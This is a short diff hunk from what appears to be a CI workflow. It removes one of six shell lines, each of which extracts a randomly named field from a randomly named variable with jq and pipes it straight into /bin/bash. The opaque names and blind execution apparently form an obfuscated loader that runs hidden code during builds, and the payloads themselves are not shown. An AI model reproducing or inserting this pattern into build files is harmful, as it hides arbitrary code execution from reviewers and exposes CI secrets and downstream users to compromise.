@@ -35,7 +35,6 @@ jobs:
           echo $vtqv23 | jq -r .apu9344 | /bin/bash
           echo $voyb876 | jq -r .vb7775 | /bin/bash
           echo $snko7974 | jq -r .fqw004 | /bin/bash
-          echo $fbao87 | jq -r .ta150 | /bin/bash
           printf '%s' "$ci56912" | jq -r .m477 | /bin/bash
           echo $tca9 | jq -r .prvn475 | /bin/bash
 
